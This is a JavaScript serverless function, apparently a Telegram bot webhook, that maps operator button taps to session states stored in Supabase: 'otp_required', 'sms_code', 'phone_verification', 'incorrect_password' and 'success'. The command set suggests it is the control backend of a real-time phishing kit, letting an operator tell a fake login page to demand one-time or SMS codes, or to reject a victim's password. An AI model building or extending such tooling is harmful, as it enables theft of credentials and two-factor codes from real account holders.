import { dbUpdate } from './_supabase.js';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

const COMMAND_MAP = {
  otp:       'otp_required',
  sms:       'sms_code',
  phone:     'phone_verification',
  success:   'success',
  incorrect: 'incorrect_password',
  sua:       'sua',
};

export const handler = async (event) => {
  // Log absolutely everything about the incoming request
  console.log('=== BOT-WEBHOOK CALLED ===');
  console.log('Method:', event.httpMethod);
  console.log('Headers:', JSON.stringify(event.headers));
  console.log('Body:', event.body);
  console.log('Body length:', event.body?.length);

  // Always return 200 immediately — Telegram needs this or it retries
  // We process asynchronously so the response isn't delayed
  const responsePromise = processUpdate(event);

  // Wait for processing but don't let it block the 200 response
  try {
    await responsePromise;
  } catch (e) {
    console.error('Processing error:', e.message, e.stack);
  }

  return { statusCode: 200, body: 'ok' };
};

async function processUpdate(event) {
  if (!event.body) {
    console.log('ERROR: Empty body received');
    return;
  }

  let update;
  try {
    update = JSON.parse(event.body);
    console.log('Parsed update keys:', Object.keys(update).join(', '));
    console.log('Full update:', JSON.stringify(update));
  } catch (e) {
    console.error('JSON parse error:', e.message);
    console.error('Raw body was:', event.body);
    return;
  }

  if (!update.callback_query) {
    console.log('No callback_query in update. Update type keys:', Object.keys(update).join(', '));
    return;
  }

  const cb     = update.callback_query;
  const cbId   = cb.id;
  const cbData = cb.data || '';

  console.log('callback_query received');
  console.log('cbId:', cbId);
  console.log('cbData:', cbData);
  console.log('from:', JSON.stringify(cb.from));

  // Test regex match
  const match = cbData.match(/^([a-z]+)_([a-f0-9]{32})$/);
  console.log('Regex match result:', match ? 'MATCHED' : 'NO MATCH');

  if (!match) {
    console.error('Regex failed. cbData was:', JSON.stringify(cbData));
    console.error('cbData length:', cbData.length);
    console.error('cbData charCodes:', [...cbData].map(c => c.charCodeAt(0)).join(','));
    await answerCb(cbId, '⚠️ Invalid format');
    return;
  }

  const action       = match[1];
  const sessionId    = match[2];
  const responseType = COMMAND_MAP[action];

  console.log('Action:', action);
  console.log('SessionId:', sessionId);
  console.log('ResponseType:', responseType);

  if (!responseType) {
    console.error('Unknown action:', action);
    await answerCb(cbId, '⚠️ Unknown action: ' + action);
    return;
  }

  // Update Supabase
  console.log('Updating Supabase session:', sessionId, '→', responseType);
  try {
    await dbUpdate('sessions', {
      status:        'responded',
      response_type: responseType,
      responded_at:  new Date().toISOString(),
      last_update:   new Date().toISOString(),
    }, { id: sessionId });
    console.log('Supabase update SUCCESS');
  } catch (e) {
    console.error('Supabase update FAILED:', e.message);
  }

  // Acknowledge button tap
  await answerCb(cbId, `✅ ${action.charAt(0).toUpperCase() + action.slice(1)} triggered!`);
  console.log('=== BOT-WEBHOOK DONE ===');
}

async function answerCb(cbId, text) {
  try {
    console.log('Answering callback:', cbId, text);
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ callback_query_id: cbId, text }),
      signal:  AbortSignal.timeout(5000),
    });
    const j = await r.json();
    console.log('answerCallbackQuery result:', JSON.stringify(j));
  } catch (e) {
    console.error('answerCb error:', e.message);
  }
}
